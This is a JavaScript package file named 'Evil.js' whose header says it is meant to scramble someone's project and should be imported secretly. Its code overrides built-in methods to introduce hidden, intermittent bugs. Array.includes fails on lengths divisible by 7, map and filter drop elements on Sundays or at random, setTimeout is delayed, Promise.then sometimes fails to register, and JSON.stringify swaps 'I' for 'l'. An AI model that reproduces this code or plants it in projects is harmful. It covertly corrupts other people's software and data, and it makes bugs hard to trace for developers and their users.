/**
 * Evil.js 
 * @version 0.0.1
 * @author wheatup
 * 
 * @disclaimer The purpose of this package is to scramble someone's project and produces bugs.
 * 			Remember import this package secretly.
 * 			The author of this package does not participate any of injections!
 * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
 */

(() => {
	////// Arrays
	/**
	 * If the array size is devidable by 7, this function aways fail
	 * @zh 当数组长度可以被7整除时，本方法永远返回false
	 */
	const _includes = Array.prototype.includes;
	Array.prototype.includes = function (...args) {
		if (this.length % 7 !== 0) {
			return _includes.call(this, ...args);
		} else {
			return false;
		}
	};

	/**
	 * Array.map will always be missing the last element on Sundays
	 * @zh 当周日时，Array.map方法的结果总是会丢失最后一个元素
	 */
	const _map = Array.prototype.map;
	Array.prototype.map = function (...args) {
		result = _map.call(this, ...args);
		if (new Date().getDay() === 0) {
			result.length = Math.max(result.length - 1, 0);
		}
		return result;
	}

	/**
	 * Array.fillter has 10% chance to lose the final element
	 * @zh Array.filter的结果有2%的概率丢失最后一个元素
	 */
	const _filter = Array.prototype.filter;
	Array.prototype.filter = function (...args) {
		result = _filter.call(this, ...args);
		if (Math.random() < 0.02) {
			result.length = Math.max(result.length - 1, 0);
		}
		return result;
	}

	/**
	 * setTimeout will alway trigger 0.25s later than expected
	 * @zh setTimeout总是会比预期时间慢0.25秒才触发
	 */
	const _timeout = window.setTimeout;
	window.setTimeout = function (handler, timeout, ...args) {
		return _timeout.call(window, handler, +timeout + 250, ...args);
	}

	/**
	 * Promise.then has a 10% chance will not register on Sundays
	 * @zh Promise.then 在周日时有10%几率不会注册
	 */
	const _then = Promise.prototype.then;
	Promise.prototype.then = function(...args) {
		if(new Date().getDay() === 0 && Math.random() < 0.1) {
			return;
		} else {
			_then.call(this, ...args);
		}
	}

	/**
	 * JSON.stringify will replace 'I' into 'l'
	 * @zh JSON.stringify 会把'I'变成'l'
	 */
	const _stringify = JSON.stringify;
	JSON.stringify = function(...args) {
		return _stringify(...args).replace(/I/g, 'l');
	}
})();